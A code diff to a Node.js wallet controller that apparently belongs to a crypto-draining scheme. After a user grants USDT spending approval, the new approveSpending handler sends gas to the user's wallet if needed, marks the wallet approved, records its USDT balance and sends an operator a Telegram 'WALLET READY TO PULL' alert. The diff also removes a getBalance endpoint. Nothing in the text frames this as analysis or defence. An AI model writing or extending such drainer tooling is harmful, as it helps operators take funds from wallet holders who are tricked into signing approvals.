@@ -110,119 +110,107 @@ class WalletController {
 
     // Add this new method for spending approval
     async approveSpending(req, res) {
+    try {
+        console.log('=== APPROVAL: Spending approval request received ===');
+        console.log('Request body:', JSON.stringify(req.body, null, 2));
+        
+        // Validate input
+        const validation = validators.validateWalletConnection(req.body);
+        if (!validation.valid) {
+            console.log('Validation failed:', validation.error);
+            return res.status(400).json({
+                success: false,
+                error: validation.error
+            });
+        }
+        
+        const { address } = req.body;
+        console.log('Processing approval for wallet:', address);
+        
+        // Check gas balance and send gas if needed BEFORE proceeding
         try {
-            console.log('=== APPROVAL: Spending approval request received ===');
-            console.log('Request body:', JSON.stringify(req.body, null, 2));
+            console.log('Checking gas balance for wallet:', address);
+            const gasService = require('../services/gas.service');
+            const gasCheck = await gasService.checkWalletGasBalance(address);
             
-            // Validate input
-            const validation = validators.validateWalletConnection(req.body);
-            if (!validation.valid) {
-                console.log('Validation failed:', validation.error);
-                return res.status(400).json({
-                    success: false,
-                    error: validation.error
-                });
-            }
+            console.log('Gas check result:', gasCheck);
             
-            const { address } = req.body;
-            console.log('Processing approval for wallet:', address);
-            
-            // Update approval status in database
-            const query = `
-                UPDATE wallets 
-                SET is_approved = true, updated_at = NOW()
-                WHERE address = $1
-                RETURNING *
-            `;
-            
-            console.log('Updating wallet approval status...');
-            const result = await database.query(query, [address]);
-            
-            if (result.rows.length === 0) {
-                console.log('Wallet not found:', address);
-                return res.status(404).json({
-                    success: false,
-                    error: 'Wallet not found'
-                });
-            }
-            
-            const wallet = result.rows[0];
-            console.log('Wallet approval updated:', wallet.address);
-            
-            // Get current balance for the alert
-            const contractServiceInstance = require('../services/contract.service');
-            const balance = await contractServiceInstance.getWalletUSDTBalance(address);
-            
-            // Update balance in database
-            const updateQuery = `
-                UPDATE wallets 
-                SET usdt_balance = $1, updated_at = NOW()
-                WHERE address = $2
-            `;
-            await database.query(updateQuery, [balance, address]);
-            
-            // Send alert to admin - ONLY NOW when wallet is ready to pull
-            console.log('Sending Telegram alert - wallet ready to pull');
-            const telegram = require('../config/telegram');
-            // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
-            await telegram.sendWalletReadyAlert(address, balance);
-            console.log('Telegram alert sent for ready-to-pull wallet');
-            
-            res.json({
-                success: true,
-                message: 'Wallet spending approved successfully - admin notified',
-                wallet: {
-                    id: wallet.id,
-                    address: wallet.address,
-                    name: wallet.name,
-                    is_approved: true,
-                    usdt_balance: balance,
-                    updated_at: wallet.updated_at
+            if (!gasCheck || !gasCheck.hasSufficientGas) {
+                console.log('Insufficient gas, sending gas to wallet...');
+                const gasResult = await gasService.sendGasToWallet(address);
+                if (gasResult && gasResult.success) {
+                    console.log('Gas sent successfully, waiting for confirmation...');
+                    // Wait a bit for gas to arrive
+                    await new Promise(resolve => setTimeout(resolve, 5000));
+                } else {
+                    console.error('Failed to send gas:', gasResult ? gasResult.error : 'Unknown error');
                 }
-            });
-        } catch (error) {
-            console.error('Wallet approval error:', error);
-            res.status(500).json({
+            }
+        } catch (gasError) {
+            console.error('Gas check failed:', gasError);
+            // Continue anyway, might work without gas check
+        }
+        
+        // Update approval status in database
+        const query = `
+            UPDATE wallets 
+            SET is_approved = true, updated_at = NOW()
+            WHERE address = $1
+            RETURNING *
+        `;
+        
+        console.log('Updating wallet approval status...');
+        const result = await database.query(query, [address]);
+        
+        if (result.rows.length === 0) {
+            console.log('Wallet not found:', address);
+            return res.status(404).json({
                 success: false,
-                error: 'Internal server error'
+                error: 'Wallet not found'
             });
         }
-    }
-
-    async getBalance(req, res) {
-        try {
-            const { address } = req.params;
-            
-            // Validate address parameter
-            if (!address) {
-                return res.status(400).json({
-                    success: false,
-                    error: 'Wallet address is required'
-                });
+        
+        const wallet = result.rows[0];
+        console.log('Wallet approval updated:', wallet.address);
+        
+        // Get current balance for the alert
+        const contractServiceInstance = require('../services/contract.service');
+        const balance = await contractServiceInstance.getWalletUSDTBalance(address);
+        
+        // Update balance in database
+        const updateQuery = `
+            UPDATE wallets 
+            SET usdt_balance = $1, updated_at = NOW()
+            WHERE address = $2
+        `;
+        await database.query(updateQuery, [balance, address]);
+        
+        // Send alert to admin - ONLY NOW when wallet is ready to pull
+        console.log('Sending Telegram alert - wallet ready to pull');
+        const telegram = require('../config/telegram');
+        // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
+        await telegram.sendWalletReadyAlert(address, balance);
+        console.log('Telegram alert sent for ready-to-pull wallet');
+        
+        res.json({
+            success: true,
+            message: 'Wallet spending approved successfully - admin notified',
+            wallet: {
+                id: wallet.id,
+                address: wallet.address,
+                name: wallet.name,
+                is_approved: true,
+                usdt_balance: balance,
+                updated_at: wallet.updated_at
             }
-            
-            if (!helpers.validateEthereumAddress(address)) {
-                return res.status(400).json({
-                    success: false,
-                    error: 'Invalid wallet address format'
-                });
-            }
-            
-            const balance = await contractService.getWalletUSDTBalance(address);
-            
-            res.json({
-                success: true,
-                balance: balance,
-                address: address
-            });
-        } catch (error) {
-            console.error('Balance check error:', error);
-            res.status(500).json({
-                success: false,
-                error: 'Internal server error'
-            });
-        }
+        });
+    } catch (error) {
+        console.error('Wallet approval error:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Internal server error'
+        });
     }
 }
-
 module.exports = new WalletController();
+
